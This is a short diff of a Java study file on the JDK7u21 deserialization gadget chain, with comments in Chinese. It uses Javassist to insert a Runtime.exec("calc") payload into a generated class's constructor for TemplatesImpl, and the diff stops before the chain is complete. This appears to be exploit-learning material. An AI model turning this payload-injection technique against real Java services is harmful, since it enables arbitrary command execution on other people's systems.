@@ -19,19 +19,25 @@ import java.util.Map;
 
 
 public class jdk7u21_mine {
+    //构造方法用下面不需要static的可以
     public class lala{
 
     }
+    //静态方法就需要用有static修饰的
+//    public static class lala{
+//
+//    }
     //步骤一 TemplatesImpl类
     public static void main(String[] args) throws Exception {
         ClassPool pool = ClassPool.getDefault();
         CtClass cc = pool.get(lala.class.getName());
         String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
         //之前说的静态初始化块和构造方法均可，这边试一下构造方法
-        cc.makeClassInitializer().insertBefore(cmd);
-//        CtConstructor cons = new CtConstructor(new CtClass[]{}, cc);
-//        cons.setBody("{"+cmd+"}");
-//        cc.addConstructor(cons);
+//        cc.makeClassInitializer().insertBefore(cmd);
+        //以下用构造方法
+        CtConstructor cons = new CtConstructor(new CtClass[]{}, cc);
+        cons.setBody("{"+cmd+"}");
+        cc.addConstructor(cons);
         //设置不重复的类名
         String randomClassName = "LaLa"+System.nanoTime();
         cc.setName(randomClassName);
